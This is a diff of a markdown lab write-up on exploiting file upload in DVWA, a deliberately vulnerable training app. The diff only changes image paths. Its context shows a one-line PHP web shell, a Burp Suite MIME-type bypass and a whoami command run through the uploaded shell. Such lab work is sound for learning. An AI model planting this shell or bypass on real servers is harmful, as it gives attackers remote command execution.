@@ -7,12 +7,12 @@ Create a PHP web shell.
 <?php system($_GET['cmd']); ?>
 ```
 
-![Target Page](images/01-target-page.__temp__.JPG)
+![Target Page](images/01-target-page.JPG)
 
 ## Step 2
 Intercept the upload request using Burp Suite.
 
-![Burp Content-Type Bypass](images/02-burp-content-type-bypass.__temp__.JPG)
+![Burp Content-Type Bypass](images/02-burp-content-type-bypass.JPG)
 
 ## Step 3
 Modify the MIME type before forwarding the request.
@@ -28,7 +28,7 @@ Upload the PHP shell successfully and execute a command.
 http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
 ```
 
-![Command Execution](images/04-command-execution.__temp__.JPG)
+![Command Execution](images/04-command-execution.JPG)
 
 ## Result
 Successfully bypassed the upload restriction and achieved command execution.
